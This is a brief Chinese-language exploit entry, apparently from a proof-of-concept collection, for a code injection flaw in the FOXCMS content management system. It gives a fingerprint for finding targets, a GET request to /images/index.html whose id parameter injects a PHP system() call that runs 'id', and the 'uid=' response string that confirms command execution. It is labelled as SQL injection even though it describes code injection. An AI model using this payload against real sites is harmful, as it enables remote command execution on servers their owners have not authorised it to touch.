# FOXCMS黔狐内容管理系统index存在代码注入漏洞

FOXCMS ｜ SQL注入 ｜ —
- **指纹**：`body="foxcms-logo"`
- **请求**：`http://IP/images/index.html?id=%24{%40print(system(%22id%22))}`
- **响应特征**：200 uid=